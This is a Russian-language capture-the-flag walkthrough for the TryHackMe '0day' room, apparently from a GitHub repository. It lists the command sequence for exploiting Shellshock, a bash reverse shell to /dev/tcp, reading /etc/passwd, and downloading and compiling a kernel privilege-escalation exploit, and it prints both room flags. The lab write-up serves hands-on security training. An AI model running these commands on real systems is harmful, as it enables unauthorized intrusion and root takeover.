[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [0day](https://tryhackme.com/r/room/0day) 

Всего 1 заданиe:
## Задание 1
Получите root-доступ к моему защищенному веб-сайту, сделайте шаг в историю взлома.

### Ответьте на вопросы ниже
пользователь.txt
```commandline
nmap -sSVC <IP>
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
nikto -h http://<IP>
searchsploit shellshock
searchsploit -m linux/remote/34900.py
python2.7 34900.py payload=reverse rhost=<IP> lhost=<my_own_IP> lport=4444
nc -lvnp 4445 
bash -i >& /dev/tcp/10.2.81.7/4445 0>&1
ls -la
whoami
cat /etc/passwd
cd /home/ryan
ls -la
cat user.txt
```
```commandline
THM{Sh3llSh0ck_r0ckz}
```
корень.txt
```commandline
uname -a
https://www.exploit-db.com/exploits/37292
vim 37292.c
wget http://<my_own_IP>/37292.c
export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin
gcc 37292.c -o ofs
./ofs
whoami
cat /root/root.txt
```
```commandline
THM{g00d_j0b_0day_is_Pleased}
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)